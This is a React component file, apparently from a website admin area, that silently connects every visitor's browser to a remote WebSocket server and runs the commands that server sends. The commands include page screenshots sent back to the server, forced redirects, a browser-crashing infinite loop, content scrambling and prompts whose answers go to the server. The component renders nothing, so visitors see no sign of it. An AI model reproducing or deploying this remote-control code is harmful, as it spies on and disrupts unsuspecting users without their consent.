// src/components/Admin/ClientPage.js

"use client";
import { useEffect, useRef, useCallback } from "react";
import { useAuth } from "@/context/AuthContext";

// --- Custom Hook for the Client Logic ---
const useBrowserClient = (websocketUrl) => {
  const { user, userProfile, loading: authLoading } = useAuth();
  const socketRef = useRef(null);
  const clientIdRef = useRef(null);
  
  // Ref to manage the connection state and timers
  const connectionManager = useRef({
    state: 'DISCONNECTED', // DISCONNECTED, CONNECTING, CONNECTED
    reconnectTimer: null,
    heartbeatTimer: null,
    pongTimer: null,
    reconnectAttempts: 0,
  }).current;


  // --- Helper to generate a compatible unique ID ---
  const generateUUID = () => {
    if (crypto && crypto.randomUUID) return crypto.randomUUID();
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
      const r = (Math.random() * 16) | 0;
      const v = c === 'x' ? r : (r & 0x3) | 0x8;
      return v.toString(16);
    });
  };

  const getClientId = useCallback(() => {
    if (userProfile?.username) return userProfile.username;
    if (user?.user_metadata?.full_name) return user.user_metadata.full_name.replace(/\s+/g, "-");
    if (clientIdRef.current) return clientIdRef.current;
    const newId = `anon_${generateUUID()}`;
    clientIdRef.current = newId;
    return newId;
  }, [user, userProfile]);

  const getClientInfo = useCallback(() => ({
    browser: navigator.userAgent.match(/Firefox|Edge|Chrome|Safari/)?.[0] || 'Unknown',
    userAgent: navigator.userAgent,
    platform: navigator.platform,
  }), []);

  const sendToServer = useCallback((type, data) => {
    if (socketRef.current?.readyState === WebSocket.OPEN) {
      socketRef.current.send(JSON.stringify({ type, id: getClientId(), data }));
    }
  }, [getClientId]);

  const executeAndConfirm = useCallback(async (action, commandFn) => {
    try {
      const details = await commandFn();
      sendToServer("action_confirmation", { action, status: "success", details: details || `${action} executed.` });
    } catch (error) {
      console.error(`[Client] Error executing '${action}':`, error);
      sendToServer("action_confirmation", { action, status: "error", details: error.message });
    }
  }, [sendToServer]);

  const handleCommand = useCallback((action, payload) => {
    executeAndConfirm(action, () => {
        // (Your existing switch statement for commands like 'redirect', 'new_tab', etc. goes here)
        // This logic does not need to change.
        switch (action) {
          case "redirect":
            if (!payload.url) throw new Error("URL is missing.");
            window.location.href = payload.url;
            return `Redirecting to ${payload.url}`;
          case "new_tab":
            if (!payload.url) throw new Error("URL is missing.");
            window.open(payload.url, "_blank");
            return `Opened ${payload.url} in new tab.`;
          case "fat_cat":
            window.open(
              "https://bloximages.newyork1.vip.townnews.com/unionleader.com/content/tncms/assets/v3/editorial/b/1e/b1e14304-d05f-5291-8541-38baf15dfa7a/5c1d2bb3c0780.image.jpg",
              "fat_cat_window",
              "width=300,height=300"
            );
            return "The cat has been released.";
          case "toggle_edit":
            document.body.contentEditable =
              document.body.contentEditable !== "true";
            return `Content editable set to ${document.body.contentEditable}.`;
          case "replace_images":
            document.querySelectorAll("img").forEach((img) => {
              img.src = "/preset-icons/sus-cat.jpg";
              img.srcset = "";
            });
            return "All images replaced.";
          case "scramble_content":
            const scrambleWord = (w) => {
              if (w.length < 3) return w;
              const mid = Array.from(w.substring(1, w.length - 1))
                .sort(() => 0.5 - Math.random())
                .join("");
              return w[0] + mid + w[w.length - 1];
            };
            const scrambleNodes = (el) => {
              if (el.hasChildNodes()) el.childNodes.forEach(scrambleNodes);
              else if (el.nodeType === 3 && el.textContent.trim().length > 0)
                el.textContent = el.textContent
                  .split(" ")
                  .map(scrambleWord)
                  .join(" ");
            };
            scrambleNodes(document.body);
            return "Content scrambled.";
          case "text_to_speech":
            if (!payload.text) throw new Error("Text is missing.");
            if (typeof SpeechSynthesisUtterance === "undefined")
              throw new Error("TTS not supported.");
            const utterance = new SpeechSynthesisUtterance(payload.text);
            window.speechSynthesis.speak(utterance);
            return `Spoke: "${payload.text}"`;
          case "request_screenshot":
            if (typeof html2canvas === "undefined")
              throw new Error("html2canvas library not found.");
            html2canvas(document.body, {
              useCORS: true,
              allowTaint: true,
            }).then((canvas) => {
              sendToServer("screenshot_response", {
                image: canvas.toDataURL("image/jpeg", 0.6),
              });
            });
            return "Screenshot capture initiated.";
          case "crash_browser":
            setTimeout(() => {
              while (true) {}
            }, 100);
            return "Browser crash initiated.";
          case "chaos_mode":
            setInterval(() => {
              const el =
                document.body.querySelectorAll("*")[
                  Math.floor(
                    Math.random() * document.body.querySelectorAll("*").length
                  )
                ];
              if (el && el.style)
                el.style.transform = `rotate(${Math.random() * 360}deg)`;
            }, 100);
            return "Chaos mode enabled.";
          case "alert":
            alert(payload.message);
            return "Alert displayed.";
          case "confirm":
            const confirmResult = confirm(payload.message);
            sendToServer("confirm_response", { value: confirmResult });
            return `User responded with ${confirmResult}.`;
          case "prompt":
            let promptResult = null;
            while (true) {
              promptResult = prompt(payload.message);
              if (promptResult === null) {
                // User clicked cancel
                break;
              }
              if (promptResult.length < payload.minLength) {
                alert(
                  `Input must be at least ${payload.minLength} characters long.`
                );
                continue;
              }
              if (promptResult.length > payload.maxLength) {
                alert(
                  `Input must be no more than ${payload.maxLength} characters long.`
                );
                continue;
              }
              break; // Valid input
            }
            sendToServer("prompt_response", { value: promptResult });
            return `User responded with: ${
              promptResult === null ? "Cancel" : promptResult
            }`;
          default:
            throw new Error(`Unknown command: ${action}`);
        }
    });
  }, [executeAndConfirm, sendToServer]);

  // --- Connection Management Effect ---
  useEffect(() => {
    if (authLoading) return; // Wait for auth to resolve

    const clearTimers = () => {
      clearTimeout(connectionManager.reconnectTimer);
      clearInterval(connectionManager.heartbeatTimer);
      clearTimeout(connectionManager.pongTimer);
    };

    const connect = () => {
      if (connectionManager.state !== 'DISCONNECTED') return;

      console.log('[Client] Attempting to connect...');
      connectionManager.state = 'CONNECTING';

      // Clean up any existing socket before creating a new one
      if (socketRef.current) {
        socketRef.current.onopen = null;
        socketRef.current.onmessage = null;
        socketRef.current.onclose = null;
        socketRef.current.onerror = null;
        if (socketRef.current.readyState !== WebSocket.CLOSED) {
            socketRef.current.close();
        }
      }
      
      const socket = new WebSocket(websocketUrl);
      socketRef.current = socket;

      socket.onopen = () => {
        console.log("[Client] Connection established.");
        connectionManager.state = 'CONNECTED';
        connectionManager.reconnectAttempts = 0; // Reset backoff on success
        sendToServer("client_hello", { info: getClientInfo() });

        // Start heartbeat
        clearTimers();
        connectionManager.heartbeatTimer = setInterval(() => {
          if (socket.readyState === WebSocket.OPEN) {
            socket.send(JSON.stringify({ type: 'ping' }));
            // Expect a pong back within a reasonable time
            connectionManager.pongTimer = setTimeout(() => {
                console.warn("[Client] Pong timeout. Connection may be stale. Reconnecting.");
                socket.close(); // This will trigger onclose and reconnect logic
            }, 5000); // 5 second timeout for pong
          }
        }, 25000); // Send ping every 25 seconds
      };

      socket.onmessage = (event) => {
        const message = JSON.parse(event.data);
        if (message.type === 'pong') {
            clearTimeout(connectionManager.pongTimer); // We got a response, connection is healthy
            return;
        }
        if (message.type === "command") {
          handleCommand(message.action, message.payload);
        }
      };

      socket.onclose = () => {
        console.log(`[Client] Disconnected.`);
        connectionManager.state = 'DISCONNECTED';
        clearTimers();

        // Exponential backoff for reconnection
        const delay = Math.min(30000, (2 ** connectionManager.reconnectAttempts) * 1000);
        connectionManager.reconnectAttempts++;
        console.log(`[Client] Retrying in ${delay / 1000}s...`);
        connectionManager.reconnectTimer = setTimeout(connect, delay);
      };

      socket.onerror = (error) => {
        console.error("[Client] WebSocket error:", error);
        // onclose will be called automatically after an error, triggering the reconnect logic.
      };
    };

    connect(); // Initial connection attempt

    return () => {
      console.log("[Client] Cleaning up WebSocket connection.");
      clearTimers();
      if (socketRef.current) {
        // Prevent reconnect logic from firing on component unmount
        socketRef.current.onclose = null; 
        socketRef.current.close();
      }
      connectionManager.state = 'DISCONNECTED';
    };
  }, [authLoading, user, websocketUrl, getClientInfo, handleCommand, sendToServer, connectionManager]);
};

// --- Component Definition ---
const Client = () => {
  useBrowserClient("wss://admin-client.deno.dev");
  return null;
};

export default Client;